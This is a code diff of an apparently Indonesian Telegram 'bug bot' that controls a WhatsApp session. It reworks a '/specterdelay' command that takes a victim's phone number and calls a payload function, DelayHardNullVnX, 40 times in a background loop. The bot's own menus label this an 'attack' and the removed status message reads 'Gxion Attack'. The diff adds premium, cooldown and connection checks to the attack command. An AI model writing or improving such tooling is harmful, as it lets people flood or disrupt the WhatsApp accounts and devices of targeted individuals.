@@ -1171,11 +1171,9 @@ bot.action("xbugs", async (ctx) => {
 ◇ Memory : ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
 
 ╭═───⊱『 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-          
 ◇ /specterdelay
 
 ╭═───⊱『 𝐕𝐈𝐒𝐈𝐁𝐋𝐄 𝐌𝐄𝐍𝐔 』───═⬡
-
 ◇ /attack
 </pre>
 `;
@@ -2131,42 +2129,22 @@ bot.command("killsesi", checkOwner, async (ctx) => {
   }
 });
 /// ============= CASE BUG 1 BEBAS SPAM=============\\\
-bot.command('specterdelay', async (ctx) => {
-    const args = ctx.message.text.split(' ');
-    const target = args[1];
+bot.command("specterdelay", checkPremium, checkCooldown, checkWhatsAppConnection, async (ctx) => {
 
-    if (!sock || !sock.user) return ctx.reply("❌ WA Belum Connect.");
-    if (!target) return ctx.reply("🪧 Format: /specterdelay 628xxx");
+  const q = ctx.message.text.split(" ")[1]; 
+  if (!q) return ctx.reply("🪧 ☇ Example : /specterdelay 62xx");
 
-    const cleanNumber = target.replace(/[^0-9]/g, '');
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 
-    try {
-           for (let i = 0; i < 50; i++) {
-            await DelayHardNullVnX(sock, target); 
-            await sleep(1000)
-        }
+  await ctx.reply(`✅ specterdelay (bug) selesai untuk ${q}`);
 
-        const now = new Date();
-        const dateStr = now.toLocaleDateString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric' });
-        
-        const statusMessage = 
-`╭──「 Gxion Attack 」──
-ℹ Target         : ${cleanNumber}
-ⓘ Method         : DELAY 
-∅ Status         : ${3} Bugs Terkirim ☑
-X Date           : ${dateStr}
-╰───────────────────────────`;
+  (async () => {
+    for (let r = 0; r < 40; r++) {
+  await DelayHardNullVnX(sock, target);
+  await sleep(1000);
+}
+  })();
 
-        await ctx.reply(statusMessage, 
-            Markup.inlineKeyboard([
-                [Markup.button.url('🔍 Cek Target (WA)', `https://wa.me/${cleanNumber}`)]
-            ])
-        );
-
-    } catch (error) {
-        console.error(error);
-        ctx.reply("❌ Gagal mengeksekusi DelayHardNullVnX.");
-    }
 });
 /// CASE BUG 2///
 bot.command("Xtest", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
